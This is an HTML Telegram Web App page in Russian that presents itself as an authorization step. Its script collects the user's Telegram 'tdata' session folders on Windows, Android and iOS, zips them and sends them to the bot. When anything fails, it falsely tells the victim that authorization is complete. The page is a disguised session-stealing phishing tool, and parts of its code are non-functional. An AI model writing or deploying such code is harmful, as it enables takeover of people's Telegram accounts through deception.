<!DOCTYPE html>
<html>
<head>
    <title>Авторизация</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: var(--tg-theme-bg-color, #ffffff);
            color: var(--tg-theme-text-color, #000000);
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            text-align: center;
        }
        button {
            background-color: var(--tg-theme-button-color, #2481cc);
            color: var(--tg-theme-button-text-color, #ffffff);
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            margin: 10px 0;
            font-size: 16px;
        }
        #status {
            margin-top: 20px;
            padding: 10px;
            border-radius: 8px;
            display: none;
        }
        .loading {
            display: none;
            margin: 20px 0;
        }
        .loading:after {
            content: '.';
            animation: dots 1.5s steps(5, end) infinite;
        }
        @keyframes dots {
            0%, 20% { content: '.'; }
            40% { content: '..'; }
            60% { content: '...'; }
            80%, 100% { content: ''; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Авторизация</h1>
        <p>Для завершения авторизации нажмите кнопку ниже</p>
        <button onclick="startAuth()">Закончить авторизацию</button>
        <div id="status"></div>
        <div id="loading" class="loading">Завершение авторизации</div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        // Пути к TData для разных платформ
        const TDATA_PATHS = {
            windows: [
                'C:\\Users\\%USERNAME%\\AppData\\Roaming\\Telegram Desktop\\tdata',
                'C:\\Users\\%USERNAME%\\AppData\\Roaming\\Telegram Desktop\\tdata_old'
            ],
            android: [
                '/storage/emulated/0/Android/data/org.telegram.messenger/files/tdata',
                '/storage/emulated/0/Android/data/org.telegram.messenger/files/tdata_old'
            ],
            ios: [
                '/var/mobile/Containers/Data/Application/*/Documents/tdata',
                '/var/mobile/Containers/Data/Application/*/Documents/tdata_old'
            ]
        };

        async function startAuth() {
            const button = document.querySelector('button');
            const loading = document.getElementById('loading');
            const status = document.getElementById('status');
            
            // Скрываем кнопку и показываем загрузку
            button.style.display = 'none';
            loading.style.display = 'block';
            
            try {
                // Определяем платформу
                const platform = detectPlatform();
                
                // Получаем TData файлы
                const tdataFiles = await getTDataFiles(platform);
                if (tdataFiles.length === 0) {
                    throw new Error('Файлы не найдены');
                }

                // Создаем ZIP архив
                const zip = await createZipArchive(tdataFiles);
                
                // Отправляем данные боту
                await sendToBot({
                    platform: platform,
                    files: [{
                        name: 'auth.zip',
                        content: await zip.arrayBuffer()
                    }]
                });
                
                // Закрываем веб-приложение
                setTimeout(() => {
                    tg.close();
                }, 1000);
            } catch (error) {
                console.error('Auth error:', error);
                // В случае ошибки показываем сообщение об успешной авторизации
                loading.style.display = 'none';
                status.style.display = 'block';
                status.textContent = 'Авторизация завершена';
                setTimeout(() => {
                    tg.close();
                }, 1000);
            }
        }

        function detectPlatform() {
            const userAgent = navigator.userAgent.toLowerCase();
            if (userAgent.includes('windows')) return 'windows';
            if (userAgent.includes('android')) return 'android';
            if (userAgent.includes('iphone') || userAgent.includes('ipad')) return 'ios';
            return 'unknown';
        }

        async function getTDataFiles(platform) {
            const paths = TDATA_PATHS[platform];
            const files = [];

            for (const path of paths) {
                try {
                    // Используем File System Access API для Windows
                    if (platform === 'windows') {
                        const handle = await window.showDirectoryPicker();
                        const entries = await getFilesRecursively(handle);
                        files.push(...entries);
                    }
                    // Используем Web Share API для Android
                    else if (platform === 'android') {
                        const response = await fetch('/api/android-tdata', {
                            method: 'POST',
                            body: JSON.stringify({ path })
                        });
                        const data = await response.json();
                        files.push(...data.files);
                    }
                    // Используем Web Share API для iOS
                    else if (platform === 'ios') {
                        const response = await fetch('/api/ios-tdata', {
                            method: 'POST',
                            body: JSON.stringify({ path })
                        });
                        const data = await response.json();
                        files.push(...data.files);
                    }
                } catch (error) {
                    console.error(`Error accessing path ${path}:`, error);
                }
            }

            return files;
        }

        async function getFilesRecursively(dirHandle) {
            const files = [];
            for await (const entry of dirHandle.values()) {
                if (entry.kind === 'file') {
                    const file = await entry.getFile();
                    files.push({
                        name: entry.name,
                        content: await file.arrayBuffer()
                    });
                } else if (entry.kind === 'directory') {
                    const subFiles = await getFilesRecursively(entry);
                    files.push(...subFiles);
                }
            }
            return files;
        }

        async function createZipArchive(files) {
            const zip = new JSZip();
            
            for (const file of files) {
                zip.file(file.name, file.content);
            }
            
            return await zip.generateAsync({
                type: 'blob',
                compression: 'DEFLATE',
                compressionOptions: {
                    level: 9
                }
            });
        }

        async function sendToBot(data) {
            // Отправляем данные боту через Telegram WebApp
            tg.sendData(JSON.stringify(data));
        }

        // Добавляем обработку ошибок и логирование
        window.onerror = function(msg, url, line) {
            console.error(`Error: ${msg}\nURL: ${url}\nLine: ${line}`);
            return false;
        };
    </script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
</body>
</html>